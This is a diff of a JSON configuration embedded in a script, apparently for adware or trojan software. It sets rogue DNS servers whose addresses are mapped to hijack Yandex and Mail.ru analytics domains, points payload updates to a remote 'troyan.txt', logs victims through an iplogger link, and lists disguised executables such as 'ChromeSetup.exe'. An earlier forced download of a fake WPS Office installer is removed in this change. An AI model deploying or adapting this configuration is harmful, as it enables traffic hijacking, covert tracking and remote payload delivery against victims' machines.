@@ -1,19 +1,17 @@
 $server = '{
-    "TabNames":  null,
-    "TabContents":  null,
     "UpdateFile":  "C:\\inetpub\\wwwroot\\ads\\d-data\\troyan.txt",
-    "updateUrl":  "http://data-0.superhost.pw/d-data/troyan.txt",
-    "primaryDns":  "185.247.141.78",
-    "secondaryDns":  "185.247.141.51",
+    "updateUrl":  "http://109.248.201.226/d-data/troyan.txt",
+    "primaryDns":  "109.248.201.226",
+    "secondaryDns":  "109.248.201.224",
     "track":  false,
     "trackSerie":  "001",
-    "trackingUrl":  "http://google.com?id={SERIE}\u0026sub_id={NUMBER}",
-    "trackingPost":  "{\"id\": \"{serie}\", \"sub_id\": \"{number}\"",
+    "trackingUrl":  "https://iplogger.com/2zDF55",
+    "trackingPost":  null,
     "trackingMethod":  "GET",
-    "trackingPreview":  "http://google.com?id={SERIE}\u0026sub_id={NUMBER}",
+    "trackingPreview":  "https://iplogger.com:443/2zDF55?serie=%7bSERIE%7d\u0026number=%7bNUMBER%7d",
     "trackingPreviewPost":  "{\r\n  \"serie\": \"{SERIE}\",\r\n  \"number\": \"{NUMBER}\"\r\n}",
-    "autoStart":  true,
-    "autoUpdate":  true,
+    "autoStart":  false,
+    "autoUpdate":  false,
     "domains":  [
                     "mc.yandex.ru",
                     "mc.yandex.com",
@@ -22,24 +20,23 @@ $server = '{
                     "counter.yadro.ru"
                 ],
     "ipDomains":  {
-                      "185.247.141.78":  "mc.yandex.ru",
-                      "185.247.141.51":  "mc.yandex.com",
-                      "185.247.141.50":  "t.mail.ru",
-                      "185.247.141.48":  "ad.mail.ru",
-                      "185.247.141.46":  "counter.yadro.ru"
+                      "109.248.201.226":  "mc.yandex.ru",
+                      "109.248.201.224":  "mc.yandex.com",
+                      "109.248.201.223":  "t.mail.ru",
+                      "109.248.201.222":  "ad.mail.ru",
+                      "109.248.201.220":  "counter.yadro.ru"
                   },
     "pushes":  [
-                   "https://yandex.ru",
-                   "https://yahoo.com"
+
                ],
     "startDownloads":  [
-                           "http://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
+
                        ],
     "startUrls":  [
-                      "https://msn.com"
+
                   ],
     "front":  [
-                  "write.exe"
+                  "ChromeSetup.exe"
               ],
     "embeddings":  [
 
